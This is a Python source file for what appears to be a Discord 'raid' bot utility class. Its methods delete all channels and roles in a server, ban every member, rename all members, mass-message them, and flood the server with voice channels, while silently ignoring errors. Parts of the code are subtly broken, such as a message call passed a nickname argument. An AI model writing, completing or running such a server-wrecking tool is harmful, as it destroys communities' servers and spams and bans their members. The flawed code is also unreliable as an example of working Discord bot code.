class Raid_Utils():
    async def delete_all_channels(guild):
        deleted = 0
        for channel in guild.channels:
            try:
                await channel.delete()
                deleted += 1
            except:
                continue
        return deleted

    async def rename_all_member(guild, name):
        for user in guild.members:
            try:
                await user.edit(nick=name)
            except:
                continue

    async def mass_dm_member(guild, message):
        success = 0
        for user in guild.members:
            try:
                await user.send(nick=message)
                success += 1
            except:
                continue
        return success

    async def delete_all_roles(guild):
        deleted = 0
        for roles in guild.roles:
            try:
                await roles.delete()
                deleted += 1
            except:
                continue
        return deleted
    
    async def ban_all_members(guild):
        deleted = 0
        for member in guild.members:
            try:
                await member.ban()
                deleted += 1
            except:
                continue
        return deleted

    async def create_voice_channels(guild, name):
        created = 0
        for _ in range(200 - len(guild.channels)):
            try:
                await guild.create_voice_channel(name=name)
                created += 1
            except:
                continue
        return created